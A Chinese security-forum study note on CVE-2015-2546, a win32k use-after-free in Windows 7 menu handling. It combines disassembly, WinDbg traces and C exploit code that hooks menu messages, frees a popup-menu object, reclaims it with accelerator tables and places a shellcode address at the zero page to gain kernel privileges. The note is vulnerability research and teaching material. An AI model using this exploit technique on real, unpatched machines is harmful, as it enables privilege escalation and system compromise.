> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [bbs.pediy.com](https://bbs.pediy.com/thread-271899.htm)

> [原创]CVE-2015-2546 学习笔记

一. 前言  

========

1. 漏洞描述  

----------

和 CVE-2014-4113 一样，这个漏洞也是因为调用 xxxSendMessage 函数的时候，没有对第一个参数进行合法性验证。用户可以通过一定的方法修改第一个参数的值，导致可以通过 xxxSendMessageTimeout 中的以下代码实现提权：  

```
.text:BF8B94E8 loc_BF8B94E8:                           
.text:BF8B94E8                 push    [ebp+Src]
.text:BF8B94EB                 push    dword ptr [ebp+UnicodeString]
.text:BF8B94EE                 push    ebx
.text:BF8B94EF                 push    esi
.text:BF8B94F0                 call    dword ptr [esi+60h]

```

与 CVE-2014-4113 不同的是，这次的漏洞在 xxxHandleMenuMessage 中调用的 xxxMNMouseMove 函数中。

2. 实验环境
-------

*   **操作系统：**Win7 X86 sp1 专业版
    
*   **编译器：**Visual Studio 2017
    
*   **调试器：**IDA Pro，WinDbg
    

二. 漏洞分析  

==========

要理解这个漏洞，需要对两个结构体有所了解，第一个是 tagMENUWND，该结构体定义如下：

```
kd> dt tagMENUWND
win32k!tagMENUWND
   +0x000 head             : _THRDESKHEAD
   +0x014 state            : Uint4B
   +0x018 state2           : Uint4B
   +0x01c ExStyle          : Uint4B
   +0x020 style            : Uint4B
   +0x024 hModule          : Ptr32 Void
   +0x028 hMod16           : Uint2B
   +0x02a fnid             : Uint2B
   +0x02c spwndNext        : Ptr32 tagWND
   +0x030 spwndPrev        : Ptr32 tagWND
   +0x034 spwndParent      : Ptr32 tagWND
   +0x038 spwndChild       : Ptr32 tagWND
   +0x03c spwndOwner       : Ptr32 tagWND
   +0x040 rcWindow         : tagRECT
   +0x050 rcClient         : tagRECT
   +0x060 lpfnWndProc      : Ptr32     long 
   +0x064 pcls             : Ptr32 tagCLS
   +0x068 hrgnUpdate       : Ptr32 HRGN__
   +0x06c ppropList        : Ptr32 tagPROPLIST
   +0x070 pSBInfo          : Ptr32 tagSBINFO
   +0x074 spmenuSys        : Ptr32 tagMENU
   +0x078 spmenu           : Ptr32 tagMENU
   +0x07c hrgnClip         : Ptr32 HRGN__
   +0x080 hrgnNewFrame     : Ptr32 HRGN__
   +0x084 strName          : _LARGE_UNICODE_STRING
   +0x090 cbwndExtra       : Int4B
   +0x094 spwndLastActive  : Ptr32 tagWND
   +0x098 hImc             : Ptr32 HIMC__
   +0x09c dwUserData       : Uint4B
   +0x0a0 pActCtx          : Ptr32 _ACTIVATION_CONTEXT
   +0x0a4 pTransform       : Ptr32 _D3DMATRIX
   +0x0a8 spwndClipboardListenerNext : Ptr32 tagWND
   +0x0ac ExStyle2         : Uint4B
   +0x0b0 PopupMenu    : Ptr32 tagPOPUPMENU

```

其中最关键得是最后一个成员，也就是偏移 0x0B0 处得 PopupMenu，该成员是一个 tagPOPUPMENU 结构体，结构体定义如下：  

```
kd> dt tagPOPUPMENU
win32k!tagPOPUPMENU
   +0x000 flags      : Uint4B
   +0x004 spwndNotify     : Ptr32 tagWND
   +0x008 spwndPopupMenu   : Ptr32 tagWND
   +0x00c spwndNextPopup   : Ptr32 tagWND
   +0x010 spwndPrevPopup   : Ptr32 tagWND
   +0x014 spmenu           : Ptr32 tagMENU
   +0x018 spmenuAlternate  : Ptr32 tagMENU
   +0x01c spwndActivePopup  : Ptr32 tagWND
   +0x020 ppopupmenuRoot   : Ptr32 tagPOPUPMENU
   +0x024 ppmDelayedFree   : Ptr32 tagPOPUPMENU
   +0x028 posSelectedItem  : Uint4B
   +0x02c posDropped       : Uint4B

```

在 xxxMNMouseMove 函数中，首先会调用 xxxMNFindWindowFromPoint 函数获取返回值，而该函数的返回值是通过 xxxSendMessage 发送 0x1EB 的消息得到的。因此，对 0x1EB 的消息进行挂钩就可以修改此处的返回值，这里的返回值需要修改成 tagMenuWnd(原因在下面)。为了触发漏洞，此处的返回值就不能是 - 1 或 - 5，这样才能绕过 2，3 的验证，而由于 4 的验证，返回值还需要是一个合法的窗口的值，因为在 IsWindowBeingDestroyed 函数中，会对窗口的属性进行检查。

![](https://bbs.pediy.com/upload/tmp/835440_VASC4EQ9FMNESB6.jpg)

接下来，函数会将 tagMenuWnd 中偏移 0xB0 处保存的结构为 tagPOPUPMENU 的 pTagMenuWnd 取出，将它作为第一个参数调用 xxxMNHideNextHierachy。可是在此之前，函数通过 xxxSendMessage 发送了两次消息，而且这两个函数的参数都是 pTagMenuWnd。那么，用户就可以在通过挂钩的方式，在调用 xxxMNHideNextHierachy 函数之前对 tagMenuWnd 中的数据进行更改，也就是更改偏移 0xB0 处的 pTagPopupMenu。

![](https://bbs.pediy.com/upload/tmp/835440_95ET9THYX5GWAZ9.jpg)

这里 IDA 反编译的结果出了问题，两个 xxxSendMessage 函数发送的消息应当分别是 0x1E5 和 0x1F0，因为它们的汇编代码分别如下：  

```
.text:BF939517 loc_BF939517:                           
.text:BF939517                 xor     edi, edi
.text:BF939519                 push    edi            
.text:BF93951A                 push    dword ptr [ebp+UnicodeString] 
.text:BF93951D                 push    1E5h            
.text:BF939522                 push    esi             
.text:BF939523                 call    _xxxSendMessage@16 ; xxxSendMessage(x,x,x,x)
.text:BF939528                 test    al, 10h
.text:BF93952A                 jz      short loc_BF939583
.text:BF93952C                 test    al, 3
.text:BF93952E                 jnz     short loc_BF939583
.text:BF939530                 push    edi             
.text:BF939531                 push    edi             
.text:BF939532                 push    1F0h            
.text:BF939537                 push    esi           
.text:BF939538                 call    _xxxSendMessage@16 ; xxxSendMessage(x,x,x,x)
.text:BF93953D                 test    eax, eax
.text:BF93953F                 jnz     short loc_BF939583
.text:BF939541                 push    ebx
.text:BF939542                 call    _xxxMNHideNextHierarchy@4 
.text:BF939547                 jmp     short loc_BF939583

```

在 xxxMNHideNextHierarchy 函数中，会将 pTagPopupMenu 偏移 0x0C 的 spwndNextPopup 作为第一个参数调用 xxxSendMessage 函数。  

![](https://bbs.pediy.com/upload/tmp/835440_BZZ7HQ7W27MMSDJ.jpg)

虽然这里第八第九行代码验证了 spwndNextPopup 是否为 0，但是，函数没有对 pTagPopupmenu 进行验证。因此，只要修改掉 spwndNextPopup，让它不为 0。

最终将导致代码 xxSendMessageTimeout 中的 call dword ptr [esi + 0x60] 就变成 call dword ptr [spwndNextPopup + 0x60]，此时只要在相应的位置放入 ShellCode 函数地址，就可以实现提权。

三. 漏洞利用  

==========

和 CVE-2014-4113 相同的是，该漏洞也需要通过 TrackPopupMenu 函数来触发，所以也需要以下的代码来创建相应的窗口

```
HWND hWnd = NULL;
WNDCLASS wc = { 0 };
HMENU hMenu1 = NULL, hMenu2 = NULL;
MENUITEMINFO Item1 = { 0 }, Item2 = { 0 };
 
memset(&wc, 0, sizeof(wc));
 
wc.hInstance = GetModuleHandle(NULL);
wc.lpfnWndProc = WndProc_2015_2546;
wc.lpszClassName = "1900";
 
if (!RegisterClassA(&wc))
{
    ShowError("RegisterClassA", GetLastError());
    bRet = FALSE;
    goto exit;
}
 
hWnd = CreateWindowA(wc.lpszClassName,
               "",
               WS_OVERLAPPEDWINDOW | WS_VISIBLE,
               0,
               0,
               640,
               480,
               NULL,
               NULL,
               wc.hInstance,
               NULL);
if (!hWnd)
{
    ShowError("CreateWindowEx", GetLastError());
    bRet = FALSE;
    goto exit;
}
 
hMenu1 = CreatePopupMenu();
if (!hMenu1)
{
    ShowError("CreatePopupMenu", GetLastError());
    bRet = FALSE;
    goto exit;
}
 
memset(&Item1, 0, sizeof(Item1));
memset(&Item2, 0, sizeof(Item2));
 
Item1.cbSize = sizeof(Item1);
Item1.fMask = MIIM_STRING;
if (!InsertMenuItemA(hMenu1, 0, TRUE, &Item1))
{
    ShowError("InsertMenuItemA 1", GetLastError());
    bRet = FALSE;
    goto exit;
}
 
hMenu2 = CreatePopupMenu();
if (!hMenu2)
{
    ShowError("CreatePopupMenu 2", GetLastError());
    bRet = FALSE;
    goto exit;
}
 
Item2.fMask = MIIM_STRING | MIIM_SUBMENU;
Item2.dwTypeData = "";
Item2.cch = 1;
Item2.hSubMenu = hMenu1;
Item2.cbSize = sizeof(Item2);
 
if (!InsertMenuItemA(hMenu2, 0, TRUE, &Item2))
{
    ShowError("InsertMenuItemA 2", GetLastError());
    bRet = FALSE;
    goto exit;
}
 
// 触发漏洞
if (!TrackPopupMenu(hMenu2, 0, 0, 0, 0, hWnd, NULL))
{
    ShowError("TrackPopupMenu", GetLastError());
    bRet = FALSE;
    goto exit;
}

```

不同的地方在于此时触发漏洞的位置是不同的，以下是部分代码：  

```
int __stdcall xxxHandleMenuMessages(int a1, int a2, WCHAR UnicodeString)
{
  uMsg = *(_DWORD *)(a1 + 4);
  if ( uMsg > 0x104 )
  {
    if ( uMsg > 0x202 )
    {
    }
    if ( uMsg == 0x202 )
      goto LABEL_80;
    v20 = uMsg - 0x105;         // uMsg - 0x105
    if ( v20 )
    {
      v21 = v20 - 1;          // uMsg - 0x1                
      if ( v21 )
      {
        v22 = v21 - 0x12;       // uMsg - 0x12
        if ( !v22 )
          return 1;
        v23 = v22 - 0xE8;       // uMsg - 0xE8
        if ( v23 )          
        {
          if ( v23 == 1 )
          {
               // CVE-2014-4113漏洞触发点
            iRet = (_DWORD *)xxxMNFindWindowFromPoint((WCHAR)v3, (int)&UnicodeString, (int)v7);
             
            if ( iRet == (_DWORD *)-1 )
              xxxMNButtonDown(v3, v12, UnicodeString, 1);
            else
              xxxSendMessage(iRet, 0xED, UnicodeString, 0);
            if ( !(v12[1] & 0x100) )
              xxxMNRemoveMessage(*(_DWORD *)(a1 + 4), 516);
          }
          return 0;
        }
     
           // CVE-2015-2546漏洞触发点
        xxxMNMouseMove((WCHAR)v3, a2, (int)v7);
        return 1;
      }
    }
  }
  return 1;
}

```

经过计算，uMsg 等于 0x201 的时候，会触发 CVE-2014-4113 的漏洞，当它等于 0x200 的时候会触发 CVE-2015-2546 的漏洞。而 uMsg 的值是由主窗口处理例程中的第三个 PostMessageA 的第二个参数决定的，根据以下的定义可以知道，本次漏洞的触发需要通过 PostMessageA 发送 WM_MOUSEMOVE 的消息

```
#define WM_MOUSEMOVE                   0x0200
#define WM_LBUTTONDOWN                  0x0201

```

并且，在进入 xxxMouseMove 函数中，会对第三个 PostMessageA 的第四个参数进行判断，该值如果为 0，将不会调用 xxxMNHideNextHierarchy 触发漏洞，所以此次的 exp 的主窗口例程的处理函数应该改成如下的代码：

```
LRESULT CALLBACK WndProc_2015_2546(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
    if (uMsg == WM_ENTERIDLE)
    {
        if (!bFlag)
        {
            bFlag = TRUE;
            PostMessageA(hWnd, WM_KEYDOWN, VK_DOWN, 0);
            PostMessageA(hWnd, WM_KEYDOWN, VK_RIGHT, 0);
            PostMessageA(hWnd, WM_MOUSEMOVE, 0, 1);
        }
        else
        {
            PostMessageA(hWnd, WM_CLOSE, 0, 0);
        }
    }
 
    return DefWindowProcA(hWnd, uMsg, wParam, lParam);
}

```

根据上面的漏洞分析可以知道，要成功调用 xxxMNHideNextHierachy 函数触发漏洞，需要对 0x1E5，0x1EB 和 0x1F0 这三个消息进行处理。对于 0x1E5，只需要返回 0x10 就符合要求，而 0x1EB 需要返回一个合法的窗口对象来绕过 IsWindowBeingDestory 函数。因此，需要通过 CreateWindowsExA 创建一个类名为 "#32768" 的窗口对象，函数会返回一个合法的 tagMENUWND 的窗口对象，当处理 0x1EB 消息的时候，将该对象返回回去就可以绕过验证。因此，此时的初始化函数应当修改为如下所示：

```
BOOL Init_2015_2546()
{
    BOOL bRet = TRUE;
    LPACCEL lpAccel = NULL;
    DWORD  i = 0;
 
    // 创建窗口对象
    g_hWnd = CreateWindowExA(0,
                 "#32768",
                 NULL,
                 0,
                 -1, -1,
                 0, 0,
                 NULL,
                 NULL,
                 NULL,
                 NULL);
 
    if (!g_hWnd)
    {
        ShowError("CreateWindowExA #32768", GetLastError());
        bRet = FALSE;
        goto exit;
    }
 
    if (!SetWindowLongA(g_hWnd, GWL_WNDPROC, (ULONG)DefaultMenuProc_2015_2546))
    {
        ShowError("SetWindowLongA", GetLastError());
        bRet = FALSE;
        goto exit;
    }
 
    // 在0地址申请内存成功
    if (!AllocateZeroMemory())
    {
        bRet = FALSE;
        goto exit;
    }
 
    *(DWORD*)(0xD) = GetPtiCurrent_2015_2546();
    *(BYTE*)(0x1B) = (BYTE)4;
    *(DWORD*)(0x65) = (DWORD)ShellCode_2015_2546;
 
exit:
    return bRet;
}

```

有了 tagMENUWND 对象，接下来就需要在 0x1F0 中想办法修改 tagMENUWND 对象的 tagPOPMENU 中偏移 0xC 的 spwndNextPopup。因为，在函数 xxxMNHideNextHierarchy 中，会对这个成员判断其值是否为 0，如果不为 0，才会将其作为第一个参数传给 xxxSendMessage 函数，而上面所创建的类名为 "#32768" 的 tagMENUWND 对象的 tagPOPMENU 中的 spwndNextPopup 为 0。

想要将其修改为非 0 值，此处需要使用到 CreateAcceleratorTable 来创建加速表对象，该函数的定义如下：

```
HACCEL CreateAcceleratorTable(LPACCEL lpaccl, 
                              int cEntries);

```

其中第二个参数指定了要创建加速表对象的个数，这里需要指定为 0x5，这样可以保证创建的空间足够容纳 tagMENUWND 结构体。因此，消息 0x1EB 的执行内容如下：

*   先销毁掉 "#32768" 窗口对象，这样会释放掉 tagPOPUPMENU 的空间
    
*   申请一些的加速表对象，这些加速表对象就会占用刚刚释放 "32768" 窗口对象的 tagPOPUPMENU 空间，这样，就可以修改 tagPOPUPMENU 中的 spwndNextPopup  
    

这样就可以实现对 xxxMNHideNextHierarchy 函数的第一个参数实现修改。

菜单窗口的处理例程，则应该如下所示：  

```
LRESULT CALLBACK MenuWndProc_2015_2546(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
    LPACCEL lpAccel = NULL;
 
    if (uMsg == 0x1EB)
    {
        return (LONG)g_hWnd;
    }
    else if (uMsg == 0x1F0)
    {
        if (g_hWnd != NULL)
        {
            // #32768窗口进行销毁,tagPopupMenu被释放
            if (!DestroyWindow(g_hWnd))
            {
                ShowError("DestroyWindow", GetLastError());
            }
 
            // 使用加速表对象占用窗口对象的空间
            for (DWORD i = 0; i < ACCELERATOR_NUMBER; i++)
            {
                lpAccel = (LPACCEL)malloc(sizeof(ACCEL) * 0x5);
                if (lpAccel) CreateAcceleratorTable(lpAccel, 0x5);
            }
        }
         
        return 0;
    }
    else if (uMsg == 0x1E5)
    {
        return 0x10;
    }
 
    return CallWindowProcA(g_lpPrevWndFunc, hWnd, uMsg, wParam, lParam);
}

```

> 这里的调用 CreateAcceleratorTable 的时候第二个参数为 0x5，链接的作者的解释是 tagPOPMENU 对象占 0x28 字节大小，而每个加速表对象占 0x8 字节大小。因此，5 个加速表对象的内存占用和一个 tagPOPMENU 对象占的大小相同。
> 
> 但是在上面可以看到一个 tagPOPMENU 对象其实是占 0x30 字节大小，而且由于对象头和_POOL_HEADER 的存在，其实它在内存中一共占有 0x40 字节的大小。因此，原作者的描述是有误的
> 
> 我的猜测是创建 0x5 个为一组加速表对象的时候，虽然这五个对象只占 0x28 个字节，但是需要有 8 字节来描述这 5 个加速表的信息，在算上 8 字节的对象头和_POOL_HEADER，刚好为 0x40
> 
> 而且每组加速表对象头偏移 0x0C 处保存的就是这一次创建的加速表对象的个数，也就是第二个参数 cEntries 的值

四. 运行结果  

==========

参考下面链接的师傅的代码写的 exp，链接在：[**https://github.com/LegendSaber/exp/blob/master/exp/CVE-2015-2546.cpp**](https://github.com/LegendSaber/exp/blob/master/exp/CVE-2015-2546.cpp)。  

在 xxxMNMouseMove 函数中下断点，运行 exp，当运行到发送 0x1F0 的消息时，此时可以看到 #32768 窗口对象的 tagPOPUPMENU 中偏移 0xC 的 spwndNextPopup 为 0

```
kd> p
win32k!xxxMNMouseMove+0x141:
96809530 57              push    edi
kd> p
win32k!xxxMNMouseMove+0x142:
96809531 57              push    edi
kd> p
win32k!xxxMNMouseMove+0x143:
96809532 68f0010000      push    1F0h
kd> p
win32k!xxxMNMouseMove+0x148:
96809537 56              push    esi
kd> p
win32k!xxxMNMouseMove+0x149:
96809538 e86000f8ff      call    win32k!xxxSendMessage (9678959d)
kd> r esi
esi=fe814a00
kd> dd fe814a00 + b0
fe814ab0  ff57a978 00000000 0001000d 0c000018
fe814ac0  00000000 c17ac17a 00000000 8784caa0
fe814ad0  00000000 00c20000 00000000 00000000
fe814ae0  00000000 fe814ac0 00000000 00000001
fe814af0  00000000 00401570 00000000 00000000
fe814b00  00400000 00000000 00000000 00000000
fe814b10  00000000 fe814b28 00000000 7fffffff
fe814b20  00010003 0f00000d 30303931 00000000
kd> dt ff57a978 tagPOPUPMENU
win32k!tagPOPUPMENU
   +0x000 fIsMenuBar       : 0y0
   +0x000 fHasMenuBar      : 0y0
   +0x000 fIsSysMenu       : 0y0
   +0x000 fIsTrackPopup    : 0y0
   +0x000 fDroppedLeft     : 0y0
   +0x000 fHierarchyDropped : 0y0
   +0x000 fRightButton     : 0y0
   +0x000 fToggle          : 0y0
   +0x000 fSynchronous     : 0y0
   +0x000 fFirstClick      : 0y0
   +0x000 fDropNextPopup   : 0y0
   +0x000 fNoNotify        : 0y0
   +0x000 fAboutToHide     : 0y0
   +0x000 fShowTimer       : 0y0
   +0x000 fHideTimer       : 0y0
   +0x000 fDestroyed       : 0y0
   +0x000 fDelayedFree     : 0y0
   +0x000 fFlushDelayedFree : 0y0
   +0x000 fFreed           : 0y0
   +0x000 fInCancel        : 0y0
   +0x000 fTrackMouseEvent : 0y0
   +0x000 fSendUninit      : 0y0
   +0x000 fRtoL            : 0y0
   +0x000 iDropDir         : 0y00000 (0)
   +0x000 fUseMonitorRect  : 0y0
   +0x004 spwndNotify      : (null) 
   +0x008 spwndPopupMenu   : 0xfe814a00 tagWND
   +0x00c spwndNextPopup   : (null) 
   +0x010 spwndPrevPopup   : (null) 
   +0x014 spmenu           : (null) 
   +0x018 spmenuAlternate  : (null) 
   +0x01c spwndActivePopup : (null) 
   +0x020 ppopupmenuRoot   : (null) 
   +0x024 ppmDelayedFree   : (null) 
   +0x028 posSelectedItem  : 0xffffffff
   +0x02c posDropped       : 0

```

调用 xxxSendMessage 发送 0x1F0 的消息后，可以看到 spwndNextPopup 被修改为 0x5  

```
kd> p
win32k!xxxMNMouseMove+0x14e:
9680953d 85c0            test    eax,eax
kd> dt ff57a978 tagPOPUPMENU
win32k!tagPOPUPMENU
   +0x000 fIsMenuBar       : 0y1
   +0x000 fHasMenuBar      : 0y1
   +0x000 fIsSysMenu       : 0y1
   +0x000 fIsTrackPopup    : 0y1
   +0x000 fDroppedLeft     : 0y1
   +0x000 fHierarchyDropped : 0y0
   +0x000 fRightButton     : 0y0
   +0x000 fToggle          : 0y1
   +0x000 fSynchronous     : 0y0
   +0x000 fFirstClick      : 0y1
   +0x000 fDropNextPopup   : 0y0
   +0x000 fNoNotify        : 0y0
   +0x000 fAboutToHide     : 0y1
   +0x000 fShowTimer       : 0y0
   +0x000 fHideTimer       : 0y0
   +0x000 fDestroyed       : 0y0
   +0x000 fDelayedFree     : 0y0
   +0x000 fFlushDelayedFree : 0y0
   +0x000 fFreed           : 0y1
   +0x000 fInCancel        : 0y0
   +0x000 fTrackMouseEvent : 0y1
   +0x000 fSendUninit      : 0y0
   +0x000 fRtoL            : 0y1
   +0x000 iDropDir         : 0y00000 (0)
   +0x000 fUseMonitorRect  : 0y0
   +0x004 spwndNotify      : (null) 
   +0x008 spwndPopupMenu   : (null) 
   +0x00c spwndNextPopup   : 0x00000005 tagWND
   +0x010 spwndPrevPopup   : 0xcdcdcdcd tagWND
   +0x014 spmenu           : 0xcdcdcdcd tagMENU
   +0x018 spmenuAlternate  : 0xcdcdcdcd tagMENU
   +0x01c spwndActivePopup : 0xcdcdcdcd tagWND
   +0x020 ppopupmenuRoot   : 0xcdcdcdcd tagPOPUPMENU
   +0x024 ppmDelayedFree   : 0xcdcdcdcd tagPOPUPMENU
   +0x028 posSelectedItem  : 0xcdcdcdcd
   +0x02c posDropped       : 0xcdcd

```

接着跟进 xxxMNHideNextHierarchy 函数，此时就会绕过该函数对 spwndNextPopup 不为 0 的验证，并将 0x5 作为第一个参数调用 xxxSendMessage

```
win32k!xxxMNHideNextHierarchy+0x37:
967e8f05 6a00            push    0
kd> p
win32k!xxxMNHideNextHierarchy+0x39:
967e8f07 6a00            push    0
kd> p
win32k!xxxMNHideNextHierarchy+0x3b:
967e8f09 68e4010000      push    1E4h
kd> p
win32k!xxxMNHideNextHierarchy+0x40:
967e8f0e 50              push    eax
kd> p
win32k!xxxMNHideNextHierarchy+0x41:
967e8f0f e88906faff      call    win32k!xxxSendMessage (9678959d)
kd> r eax
eax=00000005

```

这就会导致 call dword ptr [esi + 0x60] 变成 call dword ptr [0x5 + 0x60]，因此只需要在 0x65 的地方放入 ShellCode 的地址就可以完成提权，最终的运行结果如下：

![](https://bbs.pediy.com/upload/tmp/835440_3A3PBGVDZTKZ2FX.jpg)

五. 参考资料  

==========

*   [**https://www.anquanke.com/post/id/84911**](https://www.anquanke.com/post/id/84911)
    
*   [**https://bbs.pediy.com/thread-263673.htm**](https://bbs.pediy.com/thread-263673.htm)
    

[【公告】“雪花” 创作激励计划，3 月 1 日正式开启！](https://bbs.pediy.com/thread-271637.htm)

最后于 37 分钟前 被 1900 编辑 ，原因：

[#UAF](forum-150-1-158.htm) [#漏洞利用](forum-150-1-154.htm) [#漏洞分析](forum-150-1-153.htm) [#Windows](forum-150-1-160.htm)